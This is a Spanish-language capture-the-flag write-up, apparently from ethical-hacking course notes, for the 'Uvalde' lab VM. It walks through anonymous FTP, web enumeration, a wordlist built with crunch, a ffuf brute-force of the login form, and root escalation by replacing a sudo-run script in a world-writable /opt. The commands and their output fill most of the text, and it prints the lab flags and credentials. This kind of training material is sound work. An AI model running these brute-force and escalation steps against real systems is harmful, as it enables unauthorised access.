---
title: "🖥️ Máquina: Uvalde — Hacking Ético"
aliases:
  - Uvalde
  - uvalde
  - Máquina Uvalde
  - VM Uvalde
  - Writeup Uvalde
tags:
  - ifct0109
  - hacking-etico
  - vms
  - vulnerabilidades-web
  - linux
  - ctf
---

# 🖥️ Máquina: Uvalde

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Vulnerabilidades Web  
> **Técnicas trabajadas:** FTP anónimo · Enumeración web · Análisis de patrones de contraseña · Generación de diccionarios (crunch) · Fuerza bruta web (ffuf) · Escalada de privilegios (sudo + permisos de directorio)  
> **Descripción:** En esta práctica accederemos por FTP anónimo para recopilar información, descubriremos un patrón de generación de contraseñas en la aplicación web, crearemos un diccionario personalizado con crunch y realizaremos fuerza bruta al login. La escalada de privilegios aprovecha una mala configuración de permisos en el directorio /opt que nos permite reemplazar el script que root ejecuta con sudo.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.10`
* **`RHOST` (Víctima / Uvalde):** Ej. `10.0.0.52`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Uvalde tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

```bash
nmap -sT -p- 10.0.0.52
```

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -A -p21,22,80 10.0.0.52
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--  1 1000  1000  5154 Jan 28 20:54 output
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Agency - Start Bootstrap Theme
```

> [!info] Resultado
> Tres servicios abiertos. Lo más llamativo es que el FTP permite acceso anónimo y tiene un archivo llamado output disponible. Lo descargamos.

---

## 📁 Fase 2: FTP anónimo

```bash
ftp anonymous@10.0.0.52
```

```text
Connected to 10.0.0.52.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: (ENTER)
```

```bash
ftp> ls
```

```text
-rw-r--r--  1 1000  1000  5154 Jan 28 2023 output
```

```bash
ftp> get output
```

```bash
ftp> bye
```

```text
221 Goodbye.
```

```bash
cat output
```

> [!info] Resultado
> El archivo parece la salida de algún script del sistema. Entre la información que contiene aparece el nombre de usuario matthew, un dato que tendremos en cuenta más adelante.

---

## 🌐 Fase 3: Enumeración web

```bash
gobuster dir -r -u http://10.0.0.52 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,html,php
```

```text
/index.php           (Status: 200) [Size: 29604]
/login.php           (Status: 200) [Size: 1022]
/user.php            (Status: 200) [Size: 1022]
/success.php         (Status: 200) [Size: 1022]
/create_account.php  (Status: 200) [Size: 1003]
/mail                (Status: 200) [Size: 943]
```

> [!info] Resultado
> Varios recursos interesantes. Visitamos http://10.0.0.52/create_account.php y encontramos un formulario para crear usuarios. Creamos uno de prueba llamado tecnico y el servidor nos redirige a una URL con un parámetro en base64:

```text
http://10.0.0.52/success.php?dXNlcm5hbWU9dGVjbmljbyZwYXNzd29yZD10ZWNuaWNvMjAyNkAyMDc2
```

> [!info] Resultado
> Intentamos crear el mismo usuario de nuevo y el sistema nos dice que ya existe. Lo mismo ocurre con admin y matthew, confirmando que son usuarios reales. Decodificamos el base64 de la URL:

```bash
echo -n "dXNlcm5hbWU9dGVjbmljbyZwYXNzd29yZD10ZWNuaWNvMjAyNkAyMDc2" | base64 -d
```

```text
username=tecnico&password=tecnico2026@2076
```

> [!info] Resultado
> La contraseña sigue el patrón usuario + año + @ + 4 dígitos. El año parece ser el actual al crear la cuenta. Creamos más usuarios desde la terminal para confirmar el patrón:

```bash
curl -s -D -
```

```text
username=user&password=user2026@7733
```

> [!info] Resultado
> Confirmado: la estructura de las contraseñas generadas es siempre usuario + año + @ + 4 dígitos aleatorios. Ahora necesitamos encontrar la contraseña de matthew. Como la máquina es de 2023, el año en su contraseña será 2023. El único elemento desconocido es el pin de 4 dígitos, así que generamos un diccionario con todas las combinaciones posibles.

---

## 📖 Fase 4: Generación de diccionario con crunch

Usamos crunch para generar todas las contraseñas posibles que siguen el patrón de matthew. Los parámetros son:

> [!info] Resultado
> · 16 16: longitud mínima y máxima de 16 caracteres (la longitud exacta de matthew2023@XXXX).
> · -t matthew2023@%%%%: plantilla fija donde % representa un dígito del 0 al 9. Crunch sustituirá cada % por todos los dígitos posibles generando las 10.000 combinaciones (0000 a 9999).
> · -l aaaaaaaaaaa@aaaa: máscara literal que le indica a crunch qué caracteres de la plantilla deben tratarse como literales y cuáles como comodines. Las a marcan los caracteres fijos y los % los variables. Sin esta opción crunch interpretaría el @ como comodín de letras minúsculas.

```bash
crunch 16 16 -t matthew2023@%%%% > dmat.txt -l aaaaaaaaaaa@aaaa
```

```bash
cat dmat.txt
```

> [!info] Resultado
> El archivo contiene 10.000 líneas, desde matthew2023@0000 hasta matthew2023@9999. Con este diccionario lanzamos la fuerza bruta al login.

---

## 🔐 Fase 5: Fuerza bruta al login con ffuf

Para construir la petición correcta entramos desde el navegador en http://10.0.0.52/login.php, abrimos las DevTools con F12, vamos a la pestaña de Red e introducimos cualquier usuario y contraseña. Sobre la petición POST que aparece pulsamos botón derecho y elegimos Copiar como URL. Obtenemos algo así:

```text
curl 'http://10.0.0.52/login.php' \
  --compressed \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: PHPSESSID=gv5qaamsaot794pclen563ap6r; UserName=matthew' \
  --data-raw 'username=matthew&password=FUZZ'
```

> [!info] Resultado
> Adaptamos ese comando para usarlo con ffuf: sustituimos curl por ffuf, cambiamos --data-raw por --data, añadimos el diccionario con -w dmat.txt y filtramos las respuestas con código 200 (login fallido) con -fc 200 para quedarnos solo con los intentos que devuelvan una redirección 302 (login exitoso):

```bash
ffuf -u 'http://10.0.0.52/login.php' \
  --compressed \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: PHPSESSID=gv5qaamsaot794pclen563ap6r; UserName=matthew' \
  --data 'username=matthew&password=FUZZ' -w dmat.txt -fc 200
```

```text
matthew2023@1554  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
```

> [!info] Resultado
> Contraseña encontrada: matthew2023@1554. Accedemos por SSH:

---

## 🔑 Fase 6: Acceso SSH y flag de usuario

```bash
ssh matthew@10.0.0.52
```

```text
matthew@10.0.0.52's password: matthew2023@1554
```

```bash
cat user.txt
```

```text
6e4136fbed8f8c691996dbf42697d460
```

> [!info] Resultado
> Flag de usuario obtenida: 6e4136fbed8f8c691996dbf42697d460

---

## 🚀 Fase 7: Escalada de privilegios — permisos de directorio

```bash
sudo -l
```

```text
User matthew may run the following commands on uvalde:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
```

> [!info] Resultado
> matthew puede ejecutar /opt/superhack como root sin contraseña. Inspeccionamos el archivo y el directorio que lo contiene:

```bash
ls -ld /opt/
```

```text
drwx---rwx 2 root root 4096 Mar 13 18:13 /opt/
```

```bash
ls -la /opt/
```

```text
total 12
drwx---rwx  2 root root 4096 Feb  5  2023 .
drwxr-xr-x 18 root root 4096 Jan 22  2023 ..
-rw-r--r--  1 root root 1594 Jan 31  2023 superhack
```

> [!info] Resultado
> Aquí está la mala configuración clave. Analicemos los permisos por partes:
> Directorio /opt/ — permisos: drwx---rwx
> Los permisos de un directorio se leen en tres grupos de tres: propietario, grupo y otros.
> · rwx — el propietario (root) puede leer, escribir y entrar.
> · --- — el grupo (root) no tiene ningún permiso.
> · rwx — otros (cualquier usuario del sistema, incluido matthew) pueden leer, escribir y entrar.
> En un directorio, el permiso de escritura significa poder crear y eliminar archivos dentro de él. Sin embargo, eliminar un archivo con permisos -rw-r--r-- siendo otro usuario requiere confirmación porque el archivo en sí está protegido, pero sí podemos moverlo y crear archivos nuevos.
> Archivo /opt/superhack — permisos: -rw-r--r--
> Solo root puede escribir en el archivo directamente. Pero como tenemos permiso de escritura en el directorio /opt/, podemos eliminar el archivo original (con confirmación) y crear uno nuevo con el mismo nombre y el contenido que queramos.
> La estrategia es: hacer una copia de seguridad del original, eliminar el archivo, crear uno nuevo con una bash, y ejecutarlo con sudo como root.

```bash
cd /opt
```

```bash
cp superhack superhack_old
```

```bash
rm superhack
```

```text
rm: remove write-protected regular file 'superhack'? y
```

> [!info] Resultado
> El sistema nos advierte porque el archivo tiene permisos de solo lectura para nosotros, pero como tenemos permiso de escritura en el directorio podemos eliminarlo confirmando con y.

```bash
echo "/bin/bash" > superhack
```

```bash
sudo /bin/bash /opt/superhack
```

```bash
id
```

```text
uid=0(root) gid=0(root) grupos=0(root)
```

```bash
cat /root/root.txt
```

```text
59ec54537e98a53691f33e81500f56da
```

> [!info] Resultado
> Flag de root obtenida: 59ec54537e98a53691f33e81500f56da

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
